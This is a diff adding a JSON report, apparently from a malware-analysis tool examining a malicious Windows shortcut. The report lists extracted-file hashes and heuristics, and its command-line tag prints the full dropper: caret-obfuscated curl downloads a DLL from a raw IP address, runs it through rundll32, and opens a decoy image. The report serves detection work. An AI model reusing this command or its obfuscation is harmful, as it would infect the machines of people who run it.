@@ -1,0 +1,30 @@
+{
+    "response": {
+        "supplementary": [
+            "3a2ba2be06a3153db0d0e9934b92940eab854904d4d9715257486f66072146e1"
+        ],
+        "extracted": [
+            {
+                "name": "50202574c9.bat",
+                "sha256": "50202574c9498552257f2a3c81f89cfa630e4860d24a4eb3478fe34595f633c3"
+            }
+        ]
+    },
+    "result": {
+        "heuristics": [
+            1,
+            7
+        ],
+        "tags": {
+            "file.shortcut.icon_location": [
+                "C:\\Program Files\\Windows Photo Viewer\\PhotoViewer.dll"
+            ],
+            "file.shortcut.command_line": [
+                "C:\\Windows\\System32\\cmd.exe /c \"start 2YFRUxV1.png && c^u^rl \"\"http://138.124.183.52/zazaz/poJvYMKG2T4IG3FTaI3C61d9kqrjaTG4jQ~~/Y9KL4c43P_KjnBiEEcDDqtfX-bmhiyLj8g~~/\"\" -o %temp%\\9jXqQZQh.dll && start r^un^dl^l3^2 %temp%\\9jXqQZQh.d^l^l, #1\""
+            ],
+            "file.name.extracted": [
+                "cmd.exe"
+            ]
+        }
+    }
+}
